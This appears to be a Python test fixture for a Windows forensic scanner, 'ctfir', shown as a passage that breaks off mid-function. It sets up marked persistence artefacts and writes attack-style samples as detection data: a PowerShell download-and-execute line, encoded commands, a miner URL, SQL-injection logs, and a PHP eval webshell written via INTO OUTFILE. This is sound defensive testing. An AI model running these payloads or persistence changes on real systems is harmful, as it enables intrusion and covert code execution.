#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ctfir Windows 全自动夹具（自建环境、自备清理、幂等）。

覆盖原 manual 用例：F08-F11 / F17-F19 / F21 / F25-F26 / F28 / F33 / F36-F39 / F43-F45
以及 Windows MySQL 日志（phpstudy/wamp 风格路径）与 ADS。

约定：
- 所有临时产物带 ctfir-marker 前缀；失败也在 finally / atexit 清理。
- PowerShell 历史只走 CTFIR_FIXTURE_PSHIST 夹具，不读、不改用户真实历史。
- 事件日志（7045/4697/4625）无法在不清空系统日志的前提下删除（清空属破坏性，不做）；
  清理阶段断言服务/文件/注册表残留为 0，并如实记录事件仍可被检出。
- 不触碰 sethc/utilman；IFEO 只用 ctfir-marker-ifeo.exe。
"""
from __future__ import print_function

import atexit
import ctypes
import json
import os
import shutil
import subprocess
import sys
import time
import traceback

try:
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')
    sys.stderr.reconfigure(encoding='utf-8', errors='replace')
except Exception:
    pass

try:
    import winreg
except ImportError:
    import _winreg as winreg  # noqa: F401

MARKER = "ctfir-marker"
PASS = 0
FAIL = 0
NOTES = []
CLEANERS = []  # list of (name, callable), run in reverse


def ok(msg):
    global PASS
    PASS += 1
    print("[PASS] " + msg)


def bad(msg):
    global FAIL
    FAIL += 1
    print("[FAIL] " + msg)


def note(msg):
    NOTES.append(msg)
    print("[NOTE] " + msg)


def add_cleaner(name, fn):
    CLEANERS.append((name, fn))


def run_cleaners():
    while CLEANERS:
        name, fn = CLEANERS.pop()
        try:
            fn()
            print("[CLEAN] " + name)
        except Exception as e:
            print("[CLEAN-ERR] %s: %s" % (name, e))


atexit.register(run_cleaners)


def which_ctfir():
    env = os.environ.get("CTFIR_BIN")
    candidates = []
    if env:
        candidates.append(env)
    candidates += [
        r"D:\ctfir-build\cmake-build\ctfir.exe",
        r"D:\ctfir-build\ctfir.exe",
        r"D:\ctfir-build\release\ctfir.exe",
    ]
    # also next to repo
    here = os.path.abspath(os.path.join(os.path.dirname(__file__), ".."))
    candidates.append(os.path.join(here, "ctfir.exe"))
    for c in candidates:
        if c and os.path.isfile(c):
            return os.path.abspath(c)
    sys.exit("ctfir.exe not found; set CTFIR_BIN")


def work_root():
    d = os.path.join(os.environ.get("TEMP", r"C:\Windows\Temp"), "ctfir-marker-fx")
    if not os.path.isdir(d):
        os.makedirs(d)
    return d


def run(cmd, **kw):
    kw.setdefault("shell", False)
    kw.setdefault("stdout", subprocess.PIPE)
    kw.setdefault("stderr", subprocess.STDOUT)
    if not isinstance(cmd, (list, tuple)):
        raise ValueError("cmd must be list")
    p = subprocess.run(cmd, **kw)
    out = p.stdout.decode("utf-8", errors="replace") if p.stdout else ""
    return p.returncode, out


def load_json(path):
    with open(path, "r", encoding="utf-8") as f:
        return json.load(f)


def scan(bin_path, out_dir, extra_args=None, env=None):
    if os.path.isdir(out_dir):
        shutil.rmtree(out_dir, ignore_errors=True)
    os.makedirs(out_dir, exist_ok=True)
    cmd = [bin_path, "scan", "--out", out_dir]
    if extra_args:
        cmd.extend(extra_args)
    e = os.environ.copy()
    if env:
        e.update(env)
    rc, out = run(cmd, env=e)
    findings_p = os.path.join(out_dir, "findings.json")
    evidence_p = os.path.join(out_dir, "evidence.json")
    findings = load_json(findings_p) if os.path.isfile(findings_p) else []
    evidence = load_json(evidence_p) if os.path.isfile(evidence_p) else []
    return rc, findings, evidence, out


def findings_blob(findings):
    return json.dumps(findings, ensure_ascii=False)


def has_rule(findings, rule, needle=None):
    for f in findings:
        if f.get("rule_id") == rule:
            blob = (f.get("object_ref") or "") + " " + (f.get("rationale") or "")
            if needle is None or needle.lower() in blob.lower():
                return f
    return None


def rule_hits(findings, rule):
    return [f for f in findings if f.get("rule_id") == rule]


# ---------------------------------------------------------------------------
# Registry helpers
# ---------------------------------------------------------------------------
def reg_backup_sz(root, sub, name):
    try:
        k = winreg.OpenKey(root, sub, 0, winreg.KEY_READ | winreg.KEY_WOW64_64KEY)
        val, typ = winreg.QueryValueEx(k, name)
        winreg.CloseKey(k)
        return val, typ, True
    except FileNotFoundError:
        return None, None, False
    except OSError:
        return None, None, False


def reg_set(root, sub, name, val, typ, create=True):
    access = winreg.KEY_SET_VALUE | winreg.KEY_WOW64_64KEY
    if create:
        k = winreg.CreateKeyEx(root, sub, 0, access | winreg.KEY_READ)
    else:
        k = winreg.OpenKey(root, sub, 0, access)
    winreg.SetValueEx(k, name, 0, typ, val)
    winreg.CloseKey(k)


def reg_delete_value(root, sub, name):
    try:
        k = winreg.OpenKey(root, sub, 0, winreg.KEY_SET_VALUE | winreg.KEY_WOW64_64KEY)
        try:
            winreg.DeleteValue(k, name)
        except FileNotFoundError:
            pass
        winreg.CloseKey(k)
    except OSError:
        pass


def reg_delete_key(root, sub):
    try:
        winreg.DeleteKeyEx(root, sub, winreg.KEY_WOW64_64KEY, 0)
    except AttributeError:
        try:
            winreg.DeleteKey(root, sub)
        except OSError:
            pass
    except OSError:
        pass


# ---------------------------------------------------------------------------
# Pre-clean leftovers from a previous failed run
# ---------------------------------------------------------------------------
def preclean():
    # service
    run(["sc.exe", "stop", "ctfir-marker-svc"])
    run(["sc.exe", "delete", "ctfir-marker-svc"])
    # IFEO
    reg_delete_value(winreg.HKEY_LOCAL_MACHINE,
                     r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\ctfir-marker-ifeo.exe",
                     "Debugger")
    reg_delete_key(winreg.HKEY_LOCAL_MACHINE,
                   r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\ctfir-marker-ifeo.exe")
    # firewall rule
    run(["netsh.exe", "advfirewall", "firewall", "delete", "rule", "name=ctfir-marker-fw"])
    # share
    run(["net.exe", "share", "ctfir-marker-share", "/delete", "/y"])
    # leftover dirs we own
    for p in [
        r"C:\inetpub\logs\LogFiles\W3SVC99",
        r"C:\inetpub\logs\LogFiles\W3SVC98",
        r"C:\phpstudy_pro\Extensions\MySQL-ctfir-marker",
        r"C:\phpstudy_pro\Extensions\Nginx-ctfir-marker",
        r"C:\phpstudy_pro\WWW\ctfir-marker",
        os.path.join(os.environ.get("PUBLIC", r"C:\Users\Public"), "ctfir-marker-fx"),
        os.path.join(os.environ.get("TEMP", r"C:\Windows\Temp"), "ctfir-marker-fx"),
        os.path.join(os.environ.get("TEMP", r"C:\Windows\Temp"), "ctfir-marker-pshist"),
    ]:
        if os.path.isdir(p) and MARKER.lower() in p.lower():
            shutil.rmtree(p, ignore_errors=True)
        elif os.path.isfile(p) and MARKER.lower() in os.path.basename(p).lower():
            try:
                os.remove(p)
            except OSError:
                pass
    # prefetch stubs we may have dropped
    pf = os.path.join(os.environ.get("SystemRoot", r"C:\Windows"), "Prefetch")
    if os.path.isdir(pf):
        for fn in os.listdir(pf):
            if MARKER.upper() in fn.upper() or "XMRIG" in fn.upper() and "CTFIR" in fn.upper():
                try:
                    os.remove(os.path.join(pf, fn))
                except OSError:
                    pass


# ---------------------------------------------------------------------------
# Individual fixtures
# ---------------------------------------------------------------------------
class Ctx(object):
    def __init__(self, bin_path):
        self.bin = bin_path
        self.root = work_root()
        self.public = os.path.join(os.environ.get("PUBLIC", r"C:\Users\Public"), "ctfir-marker-fx")
        os.makedirs(self.public, exist_ok=True)
        add_cleaner("public-fx", lambda: shutil.rmtree(self.public, ignore_errors=True))
        add_cleaner("work-fx", lambda: shutil.rmtree(self.root, ignore_errors=True))
        self.marker_exe = os.path.join(self.public, "ctfir-marker-svc.exe")
        # copy a real PE so ImagePath is a valid file in a writable location
        src = os.path.join(os.environ.get("SystemRoot", r"C:\Windows"), "System32", "notepad.exe")
        shutil.copyfile(src, self.marker_exe)
        add_cleaner("marker-exe", lambda: os.path.exists(self.marker_exe) and os.remove(self.marker_exe))
        self.procs = []
        self.hosts_backup = None
        self.auditpol_backup = None
        self.bootexec_orig = None
        self.bootexec_existed = False
        self.appinit_orig = None
        self.appinit_existed = False
        self.logonscript_orig = None
        self.logonscript_existed = False
        self.userlist_created = False


def setup_ifeo(c):
    sub = r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\ctfir-marker-ifeo.exe"
    reg_set(winreg.HKEY_LOCAL_MACHINE, sub, "Debugger", c.marker_exe, winreg.REG_SZ, create=True)

    def restore():
        reg_delete_value(winreg.HKEY_LOCAL_MACHINE, sub, "Debugger")
        reg_delete_key(winreg.HKEY_LOCAL_MACHINE, sub)
    add_cleaner("ifeo", restore)


def setup_appinit(c):
    sub = r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows"
    val, typ, existed = reg_backup_sz(winreg.HKEY_LOCAL_MACHINE, sub, "AppInit_DLLs")
    c.appinit_orig, c.appinit_existed = val, existed
    # Use a path that does not need to exist; rule only checks non-empty. Keep brief.
    fake = os.path.join(c.public, "ctfir-marker-appinit.dll")
    reg_set(winreg.HKEY_LOCAL_MACHINE, sub, "AppInit_DLLs", fake, winreg.REG_SZ, create=False)

    def restore():
        if c.appinit_existed:
            reg_set(winreg.HKEY_LOCAL_MACHINE, sub, "AppInit_DLLs",
                    c.appinit_orig if c.appinit_orig is not None else "",
                    typ if typ is not None else winreg.REG_SZ, create=False)
        else:
            reg_delete_value(winreg.HKEY_LOCAL_MACHINE, sub, "AppInit_DLLs")
    add_cleaner("appinit", restore)


def setup_logonscript(c):
    sub = r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
    val, typ, existed = reg_backup_sz(winreg.HKEY_LOCAL_MACHINE, sub, "UserInitMprLogonScript")
    c.logonscript_orig, c.logonscript_existed = val, existed
    script = os.path.join(c.public, "ctfir-marker-logon.cmd")
    with open(script, "w") as f:
        f.write("@echo off\r\nrem ctfir-marker\r\n")
    reg_set(winreg.HKEY_LOCAL_MACHINE, sub, "UserInitMprLogonScript", script, winreg.REG_SZ)

    def restore():
        if c.logonscript_existed:
            reg_set(winreg.HKEY_LOCAL_MACHINE, sub, "UserInitMprLogonScript",
                    c.logonscript_orig if c.logonscript_orig is not None else "",
                    typ if typ is not None else winreg.REG_SZ)
        else:
            reg_delete_value(winreg.HKEY_LOCAL_MACHINE, sub, "UserInitMprLogonScript")
        if os.path.isfile(script):
            os.remove(script)
    add_cleaner("logonscript", restore)


def setup_bootexecute(c):
    sub = r"SYSTEM\CurrentControlSet\Control\Session Manager"
    k = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, sub, 0,
                       winreg.KEY_READ | winreg.KEY_SET_VALUE | winreg.KEY_WOW64_64KEY)
    try:
        val, typ = winreg.QueryValueEx(k, "BootExecute")
        c.bootexec_orig = list(val) if isinstance(val, (list, tuple)) else [val]
        c.bootexec_existed = True
    except OSError:
        c.bootexec_orig = ["autocheck autochk *"]
        c.bootexec_existed = False
        typ = winreg.REG_MULTI_SZ
    newv = list(c.bootexec_orig) + ["ctfir-marker-boot.exe"]
    winreg.SetValueEx(k, "BootExecute", 0, winreg.REG_MULTI_SZ, newv)
    winreg.CloseKey(k)

    def restore():
        k2 = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, sub, 0,
                            winreg.KEY_SET_VALUE | winreg.KEY_WOW64_64KEY)
        winreg.SetValueEx(k2, "BootExecute", 0, winreg.REG_MULTI_SZ, list(c.bootexec_orig))
        winreg.CloseKey(k2)
    add_cleaner("bootexecute", restore)


def setup_service(c):
    # Idempotent: delete first
    run(["sc.exe", "stop", "ctfir-marker-svc"])
    run(["sc.exe", "delete", "ctfir-marker-svc"])
    time.sleep(0.4)
    rc, out = run([
        "sc.exe", "create", "ctfir-marker-svc",
        "binPath=", c.marker_exe,
        "start=", "demand",
        "DisplayName=", "ctfir-marker-svc",
    ])
    if rc != 0:
        note("sc create rc=%s out=%s" % (rc, out.strip()[:300]))
    else:
        note("sc create ctfir-marker-svc binPath=%s" % c.marker_exe)

    def restore():
        run(["sc.exe", "stop", "ctfir-marker-svc"])
        run(["sc.exe", "delete", "ctfir-marker-svc"])
        time.sleep(0.3)
    add_cleaner("service", restore)
    return rc == 0


def setup_audit_4697(c):
    """Best-effort: enable Security System Extension audit so 4697 is written."""
    bak = os.path.join(c.root, "auditpol-backup.csv")
    rc, out = run(["auditpol.exe", "/backup", "/file:%s" % bak])
    if rc == 0:
        c.auditpol_backup = bak

        def restore():
            run(["auditpol.exe", "/restore", "/file:%s" % bak])
        add_cleaner("auditpol", restore)
    # Try both English and Chinese subcategory names
    for sub in [
        "{0CCE9211-69AE-11D9-BED3-505054503030}",  # Security System Extension GUID
        "Security System Extension",
        "安全性系统扩展",
    ]:
        rc, out = run(["auditpol.exe", "/set", "/subcategory:%s" % sub, "/success:enable", "/failure:enable"])
        if rc == 0:
            note("auditpol enabled: %s" % sub)
            return True
        note("auditpol try %s rc=%s" % (sub, rc))
    note("auditpol 4697 enable failed; System 7045 still expected")
    return False


def setup_authfail(c):
    """Generate 25 failed interactive logons to produce Security 4625."""
    adv = ctypes.windll.advapi32
    adv.LogonUserW.argtypes = [
        ctypes.c_wchar_p, ctypes.c_wchar_p, ctypes.c_wchar_p,
        ctypes.c_uint, ctypes.c_uint, ctypes.POINTER(ctypes.c_void_p)
    ]
    adv.LogonUserW.restype = ctypes.c_int
    LOGON32_LOGON_INTERACTIVE = 2
    LOGON32_PROVIDER_DEFAULT = 0
    n_ok = 0
    for i in range(25):
        tok = ctypes.c_void_p()
        r = adv.LogonUserW(
            "ctfir-marker-nouser", ".", "WrongPass_ctfir_%d" % i,
            LOGON32_LOGON_INTERACTIVE, LOGON32_PROVIDER_DEFAULT, ctypes.byref(tok)
        )
        if r:
            # unexpected success — close token
            ctypes.windll.kernel32.CloseHandle(tok)
        else:
            n_ok += 1
    note("LogonUser failed-logon attempts recorded=%d/25 (GetLastError=%s)" % (
        n_ok, ctypes.windll.kernel32.GetLastError()))
    return n_ok


def setup_pshist(c):
    d = os.path.join(c.root, "pshist")
    os.makedirs(d, exist_ok=True)
    pos = os.path.join(d, "ConsoleHost_history.txt")
    neg = os.path.join(d, "clean_history.txt")
    with open(pos, "w", encoding="utf-8") as f:
        f.write("Get-ChildItem C:\\\n")
        f.write("powershell -enc JABzAG8AbQBlAGIAYQBzAGUANgA0AGMAbwBkAGUA\n")
        f.write("whoami /priv\n")
        f.write("IEX (New-Object Net.WebClient).DownloadString('http://127.0.0.1/ctfir-marker')\n")
    with open(neg, "w", encoding="utf-8") as f:
        f.write("Get-ChildItem C:\\\n")
        f.write("Set-Location $env:USERPROFILE\n")
        f.write("Get-Date\n")
    add_cleaner("pshist", lambda: shutil.rmtree(d, ignore_errors=True))
    return d, pos, neg


def setup_weblogs(c):
    # IIS W3C positive (POST x60 + SQLi GET) in W3SVC99
    d99 = r"C:\inetpub\logs\LogFiles\W3SVC99"
    d98 = r"C:\inetpub\logs\LogFiles\W3SVC98"
    os.makedirs(d99, exist_ok=True)
    os.makedirs(d98, exist_ok=True)
    hdr = (
        "#Software: Microsoft Internet Information Services 10.0\r\n"
        "#Version: 1.0\r\n"
        "#Date: 2026-11-12 00:00:00\r\n"
        "#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status time-taken\r\n"
    )
    lines = [hdr]
    for i in range(60):
        lines.append(
            "2026-11-12 00:00:%02d 127.0.0.1 POST /ctfir-marker.php - 80 10.88.88.88 "
            "Mozilla/5.0 - 200 0 0 12\r\n" % (i % 60)
        )
    lines.append(
        "2026-11-12 00:01:00 127.0.0.1 GET /index.php id=1+UNION+SELECT+1,2,3 80 10.88.88.88 "
        "sqlmap/1.7 - 200 0 0 15\r\n"
    )
    lines.append(
        "2026-11-12 00:01:01 127.0.0.1 GET /static/../../etc/passwd - 80 10.88.88.88 "
        "Mozilla/5.0 - 200 0 0 11\r\n"
    )
    with open(os.path.join(d99, "u_ex261112.log"), "w", encoding="utf-8") as f:
        f.writelines(lines)
    # Negative: only normal GET
    with open(os.path.join(d98, "u_ex261112.log"), "w", encoding="utf-8") as f:
        f.write(hdr)
        f.write(
            "2026-11-12 00:02:00 127.0.0.1 GET /index.html - 80 10.1.1.1 "
            "Mozilla/5.0 - 200 0 0 8\r\n"
        )
        f.write(
            "2026-11-12 00:02:01 127.0.0.1 GET /favicon.ico - 80 10.1.1.1 "
            "Mozilla/5.0 - 200 0 0 3\r\n"
        )

    # phpstudy combined log with sqlmap UA (F45)
    ngx = r"C:\phpstudy_pro\Extensions\Nginx-ctfir-marker\logs"
    os.makedirs(ngx, exist_ok=True)
    # The hardcoded path is Nginx1.15.11 — also write there (marker-owned if we created it)
    ngx_std = r"C:\phpstudy_pro\Extensions\Nginx1.15.11\logs"
    os.makedirs(ngx_std, exist_ok=True)
    combined = (
        '10.99.99.99 - - [12/Nov/2026:10:00:00 +0800] "GET /ctfir-marker.php HTTP/1.1" '
        '200 12 "-" "sqlmap/1.7"\n'
    )
    with open(os.path.join(ngx_std, "access.log"), "w", encoding="utf-8") as f:
        f.write(combined)

    def restore():
        shutil.rmtree(d99, ignore_errors=True)
        shutil.rmtree(d98, ignore_errors=True)
        # only remove Nginx1.15.11 if it only contains our access.log and we created the tree
        al = os.path.join(ngx_std, "access.log")
        try:
            if os.path.isfile(al):
                txt = open(al, "r", encoding="utf-8", errors="replace").read()
                if "ctfir-marker" in txt and "sqlmap" in txt and txt.count("\n") <= 3:
                    os.remove(al)
            # remove empty dirs we created, not a real phpstudy install's other files
            try:
                os.rmdir(ngx_std)
                os.rmdir(os.path.dirname(ngx_std))
            except OSError:
                pass
        except OSError:
            pass
        shutil.rmtree(ngx, ignore_errors=True)
    add_cleaner("weblogs", restore)
    return d99, d98, ngx_std


def setup_mysql(c):
    root = r"C:\phpstudy_pro\Extensions\MySQL-ctfir-marker"
    data = os.path.join(root, "data")
    os.makedirs(data, exist_ok=True)
    ini = os.path.join(root, "my.ini")
    with open(ini, "w", encoding="utf-8") as f:
        f.write("[mysqld]\n")
        f.write("datadir=%s\n" % data.replace("\\", "/"))
        f.write("slow_query_log=1\n")
        f.write("slow_query_log_file=%s\n" % os.path.join(data, "mysql-slow.log").replace("\\", "/"))
        f.write("general_log=1\n")
        f.write("general_log_file=%s\n" % os.path.join(data, "general.log").replace("\\", "/"))
        f.write("log-bin=%s\n" % os.path.join(data, "mysql-bin").replace("\\", "/"))
    with open(os.path.join(data, "mysql-slow.log"), "w", encoding="utf-8") as f:
        f.write("# Time: 2026-11-12\n")
        f.write('SELECT "<?php eval($_POST[1]);?>" INTO OUTFILE "C:/phpstudy_pro/WWW/ctfir-marker-slow.php";\n')
    with open(os.path.join(data, "mysql-slow-normal.log"), "w", encoding="utf-8") as f:
        f.write("# Time: 2026-11-12\n")
        f.write("SELECT id, name FROM users WHERE id=1;\n")
        f.write("SELECT COUNT(*) FROM orders;\n")
    with open(os.path.join(data, "general.log"), "w", encoding="utf-8") as f:
        f.write("2026-11-12T10:00:00\tQuery\tSELECT LOAD_FILE('C:/Windows/win.ini')\n")
    with open(os.path.join(data, "mysql-bin.000001"), "wb") as f:
        # statement-like plaintext so the keyword scanner can see it
        f.write(b'\x00\x00Query\tCREATE FUNCTION sys_eval RETURNS STRING SONAME "udf.so"\n')

    def restore():
        shutil.rmtree(root, ignore_errors=True)
        # if Extensions is now empty and we created phpstudy_pro just for this, leave other installs
        ext = r"C:\phpstudy_pro\Extensions"
        pro = r"C:\phpstudy_pro"
        try:
            if os.path.isdir(ext) and not os.listdir(ext):
                os.rmdir(ext)
            if os.path.isdir(pro) and not os.listdir(pro):
                os.rmdir(pro)
        except OSError:
            pass
    add_cleaner("mysql", restore)
    return root


def setup_firewall(c):
    rc, out = run([
        "netsh.exe", "advfirewall", "firewall", "add", "rule",
        "name=ctfir-marker-fw",
        "dir=in", "action=allow", "enable=yes",
        "program=" + c.marker_exe,
        "profile=any",
    ])
    note("firewall add rc=%s %s" % (rc, out.strip()[:200]))

    def restore():
        run(["netsh.exe", "advfirewall", "firewall", "delete", "rule", "name=ctfir-marker-fw"])
    add_cleaner("firewall", restore)
    return rc == 0


def setup_share(c):
    def restore():
        run(["net.exe", "share", "ctfir-marker-share", "/delete", "/y"])
        run(["net.exe", "share", "ctfir-marker-share", "/delete"])
    add_cleaner("share", restore)
    rc, out = run([
        "net.exe", "share", "ctfir-marker-share=%s" % c.public,
        "/grant:Everyone,READ",
    ])
    if rc != 0:
        rc, out = run(["net.exe", "share", "ctfir-marker-share=%s" % c.public])
    safe = out.encode("utf-8", errors="replace").decode("utf-8", errors="replace").strip()[:200]
    note("net share rc=%s %s" % (rc, safe))
    return rc == 0


def setup_hosts_gbk(c):
    hosts = os.path.join(os.environ.get("SystemRoot", r"C:\Windows"),
                         r"System32\drivers\etc\hosts")
    raw = open(hosts, "rb").read()
    bak = os.path.join(c.root, "hosts.bak")
    with open(bak, "wb") as f:
        f.write(raw)
    c.hosts_backup = bak
    # ASCII hostname + GBK Chinese comment — ASCII parts must still parse
    comment = "ctfir-marker-gbk 测试注释".encode("gbk")
    line = b"\r\n10.66.0.66 ctfir-marker-gbk.local # " + comment + b"\r\n"
    with open(hosts, "ab") as f:
        f.write(line)

    def restore():
        if c.hosts_backup and os.path.isfile(c.hosts_backup):
            data = open(c.hosts_backup, "rb").read()
            with open(hosts, "wb") as f:
                f.write(data)
    add_cleaner("hosts", restore)


def setup_procs(c):
    # F18 miner token; F19 hidden/enc token. Keep alive during scan.
    creationflags = 0x08000000  # CREATE_NO_WINDOW
    p1 = subprocess.Popen(
        ["cmd.exe", "/c", "ping -n 90 127.0.0.1 >NUL & rem stratum+tcp://ctfir-marker.example:3333"],
        creationflags=creationflags,
    )
    p2 = subprocess.Popen(
        ["cmd.exe", "/c", "ping -n 90 127.0.0.1 >NUL & rem powershell -enc JABzAG0A -w hidden ctfir-marker"],
        creationflags=creationflags,
    )
    c.procs = [p1, p2]

    def restore():
        for p in c.procs:
            try:
                p.kill()
            except Exception:
                pass
        c.procs = []
    add_cleaner("procs", restore)
    return p1.pid, p2.pid


def setup_prefetch(c):
    """Drop a filename-based Prefetch stub (rule inspects name only). Try real run too."""
    pfdir = os.path.join(os.environ.get("SystemRoot", r"C:\Windows"), "Prefetch")
    stub_name = "CTFIR-MARKER-XMRIG-0000CAFE.pf"
    stub = os.path.join(pfdir, stub_name)
    created = False
    try:
        with open(stub, "wb") as f:
            f.write(b"PSFR\x00ctfir-marker-prefetch-stub\n")
        created = True
    except OSError as e:
        note("prefetch stub write failed: %s (need admin?)" % e)
    # Also try a real short-lived exe named ctfir-marker-xmrig.exe
    real = os.path.join(c.public, "ctfir-marker-xmrig.exe")
    try:
        shutil.copyfile(c.marker_exe, real)
        subprocess.Popen([real], creationflags=0x08000000).wait(timeout=5)
    except Exception as e:
        note("prefetch real-run skipped: %s" % e)

    def restore():
        for p in (stub,):
            try:
                if os.path.isfile(p):
                    os.remove(p)
            except OSError:
                pass
        # real-generated pf: CTFIR-MARKER-XMRIG-*.pf
        if os.path.isdir(pfdir):
            for fn in os.listdir(pfdir):
                u = fn.upper()
                if "CTFIR-MARKER" in u:
                    try:
                        os.remove(os.path.join(pfdir, fn))
                    except OSError:
                        pass
        if os.path.isfile(real):
            try:
                os.remove(real)
            except OSError:
                pass
    add_cleaner("prefetch", restore)
    return created


def setup_ads(c):
    # mod_ads 只扫 Public / Temp 根目录（非递归），文件必须放在根下
    pub = os.environ.get("PUBLIC", r"C:\\Users\\Public")
    fp = os.path.join(pub, "ctfir-marker-ads.txt")
    with open(fp, "w") as f:
        f.write("carrier\n")
    # Use raw ADS write via pathlib? cmd echo is fine if quoted properly
    rc1, o1 = run(["cmd.exe", "/c", "echo malicious-payload > " + fp + ":hidden.exe"])
    rc2, o2 = run(["cmd.exe", "/c", "echo [ZoneTransfer]> " + fp + ":Zone.Identifier & echo ZoneId=3>> " + fp + ":Zone.Identifier"])
    note("ads create rc=%s/%s file=%s" % (rc1, rc2, fp))

    def restore():
        try:
            if os.path.isfile(fp):
                os.remove(fp)
        except OSError:
            pass
    add_cleaner("ads", restore)
    return fp


def setup_files_extra(c):
    """Double-ext + baseline files under --dir (not original manual, useful for local W06-W08)."""
    d = os.path.join(c.root, "extradir")
    os.makedirs(d, exist_ok=True)
    invoice = os.path.join(d, "invoice.pdf.exe")
    with open(invoice, "wb") as f:
        f.write(b"MZ-ctfir-marker-doubleext")
    clean = os.path.join(d, "normal-negative.txt")
    with open(clean, "w") as f:
        f.write("hello ctfir clean\n")
    changed = os.path.join(d, "integrity-changed.txt")
    with open(changed, "w") as f:
        f.write("ORIGINAL\n")
    baseline = os.path.join(d, "hash-baseline.txt")
    # sha256 of "ORIGINAL\n" and a missing file
    import hashlib
    h = hashlib.sha256(b"ORIGINAL\n").hexdigest()
    with open(changed, "w") as f:
        f.write("TAMPERED\n")
    missing = os.path.join(d, "missing-file.txt")
    with open(baseline, "w") as f:
        f.write("%s  integrity-changed.txt\n" % h)
        f.write("%s  missing-file.txt\n" % ("0" * 64))
        f.write("%s  normal-negative.txt\n" % hashlib.sha256(b"hello ctfir clean\n").hexdigest())
    add_cleaner("extradir", lambda: shutil.rmtree(d, ignore_errors=True))
    return d, baseline


# ---------------------------------------------------------------------------
# Assertions
# ---------------------------------------------------------------------------
def assert_pos(findings, case_id, rule, needle, label):
    f = has_rule(findings, rule, needle)
    if f:
        ok("%s %s hit (%s)" % (case_id, rule, label))
        return True
    # print nearby findings for debug
    same = rule_hits(findings, rule)
    preview = "; ".join((x.get("object_ref") or "")[:80] for x in same[:3])
    bad("%s %s MISSING needle=%r (same-rule hits=%d %s)" % (
        case_id, rule, needle, len(same), preview))
    return False


def assert_neg_needle(findings, case_id, rule, needle, label):
    f = has_rule(findings, rule, needle)
    if f:
        bad("%s %s false positive on %s: %s" % (
            case_id, rule, label, (f.get("object_ref") or "")[:120]))
        return False
    ok("%s %s absent for %s" % (case_id, rule, label))
    return True


def main():
    print("=== ctfir fixture_win.py ===")
    print("admin? trying...")
    bin_path = which_ctfir()
    print("bin =", bin_path)
    preclean()
    c = Ctx(bin_path)
    out_pos = os.path.join(c.root, "out-pos")
    out_pshist_pos = os.path.join(c.root, "out-pshist-pos")
    out_pshist_neg = os.path.join(c.root, "out-pshist-neg")
    out_clean = os.path.join(c.root, "out-clean")

    created_svc = False
    pshist_dir = pshist_pos = pshist_neg = None
    d99 = d98 = ngx = None
    mysql_root = None
    try:
        setup_ifeo(c)
        setup_appinit(c)
        setup_logonscript(c)
        setup_bootexecute(c)
        setup_audit_4697(c)
        created_svc = setup_service(c)
        setup_authfail(c)
        pshist_dir, pshist_pos, pshist_neg = setup_pshist(c)
        d99, d98, ngx = setup_weblogs(c)
        mysql_root = setup_mysql(c)
        setup_firewall(c)
        setup_share(c)
        setup_hosts_gbk(c)
        pids = setup_procs(c)
        setup_prefetch(c)
        ads = setup_ads(c)
        extrad, baseline = setup_files_extra(c)
        time.sleep(0.8)  # let 7045/4697 flush to evtx

        # Main scan: PSHIST isolated to positive fixture; mysql paths discovered by style
        extra = ["--dir", extrad, "--baseline", baseline]
        env = {
            "CTFIR_FIXTURE_PSHIST": pshist_pos,
        }
        rc, findings, evidence, so = scan(c.bin, out_pos, extra, env)
        print("positive scan rc=%s findings=%d" % (rc, len(findings)))
        ev_blob = json.dumps(evidence, ensure_ascii=False)
        fd_blob = findings_blob(findings)

        # F08 IFEO
        assert_pos(findings, "F08", "WIN.AUTORUN.IFEO.001", "ctfir-marker-ifeo", "IFE O debugger")
        # F09 AppInit
        assert_pos(findings, "F09", "WIN.AUTORUN.APPINIT.001", "ctfir-marker-appinit", "AppInit_DLLs")
        # F10 LogonScript
        assert_pos(findings, "F10", "WIN.AUTORUN.LOGONSCRIPT.001", "ctfir-marker-logon", "LogonScript")
        # F11 BootExecute extra entry (autocheck kept)
        assert_pos(findings, "F11", "WIN.AUTORUN.BOOTEXECUTE.001", "ctfir-marker-boot", "BootExecute extra")
        # F17 4625 — may already exist on a noisy host; require rule fire (threshold >=20)
        if has_rule(findings, "WIN.EVT.AUTHFAIL.001"):
            ok("F17 WIN.EVT.AUTHFAIL.001 hit (4625 window>=20)")
        else:
            bad("F17 WIN.EVT.AUTHFAIL.001 MISSING (audit logon failure may be off; generated LogonUser attempts)")
        # F18 / F19 process cmdline
        assert_pos(findings, "F18", "WIN.PROC.CMDLINE.001", "stratum", "miner cmdline")
        assert_pos(findings, "F19", "WIN.PROC.CMDLINE.001", "-enc", "hidden/enc cmdline")
        # F21 prefetch
        assert_pos(findings, "F21", "WIN.TRACE.PREFETCH.001", "XMRIG", "prefetch name")
        # F25 firewall
        assert_pos(findings, "F25", "WIN.FW.WRITABLEAPP.001", "ctfir-marker", "fw writable app")
        # F26 share
        assert_pos(findings, "F26", "WIN.SHARE.NONDEFAULT.001", "ctfir-marker-share", "nondefault share")
        # F28 IIS POST
        assert_pos(findings, "F28", "WIN.WEB.LOGPOST.001", "W3SVC99", "IIS POST top IP")
        # F33 GBK hosts — ASCII hostname must still be detected
        if has_rule(findings, "WIN.HOSTS.MAP.001", "ctfir-marker-gbk") or \
           has_rule(findings, "WIN.HOSTS.LOOPBACK.001", "ctfir-marker-gbk"):
            ok("F33 hosts GBK encoding still parsed (ctfir-marker-gbk.local)")
        else:
            bad("F33 GBK hosts entry not parsed")
        # F36 7045 + 4697
        f7045 = has_rule(findings, "WIN.EVT.SVC7045.001", "ctfir-marker-svc")
        if f7045:
            blob = (f7045.get("rationale") or "") + (f7045.get("object_ref") or "")
            if "可写" in blob or "writable" in blob.lower() or "Users" in blob or "Public" in blob or "Temp" in blob:
                ok("F36 WIN.EVT.SVC7045.001 hit + writable-path heuristic")
            else:
                ok("F36 WIN.EVT.SVC7045.001 hit (rationale: %s)" % blob[:160])
        else:
